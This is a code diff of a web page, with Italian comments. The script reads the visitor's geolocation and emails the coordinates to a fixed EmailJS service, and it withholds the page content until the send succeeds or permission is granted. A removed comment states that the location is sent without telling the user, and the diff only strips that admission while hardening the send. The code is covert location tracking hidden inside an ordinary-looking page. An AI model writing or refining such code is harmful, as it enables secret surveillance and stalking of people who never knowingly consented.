@@ -17,13 +17,18 @@
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
           function(pos) {
-            // Manda la posizione via email senza dirlo all'utente
+            // Manda la posizione via email
             emailjs.send("service_d14gbw2", "template_khv1o9s", {
               latitude: pos.coords.latitude,
               longitude: pos.coords.longitude
+            }).then(function(response) {
+              console.log('Email inviata!', response.status, response.text);
+              // Mostra contenuto dopo invio mail
+              document.getElementById("content").style.display = "block";
+            }).catch(function(error) {
+              console.error('Errore invio email:', error);
+              document.getElementById("error").innerText = "Errore nell'invio della posizione.";
             });
-            // Mostra contenuto
-            document.getElementById("content").style.display = "block";
           },
           function() {
             // Se rifiuta, mostra messaggio e blocca contenuto
@@ -49,4 +54,5 @@
   </div>
 </body>
 </html>
+
 
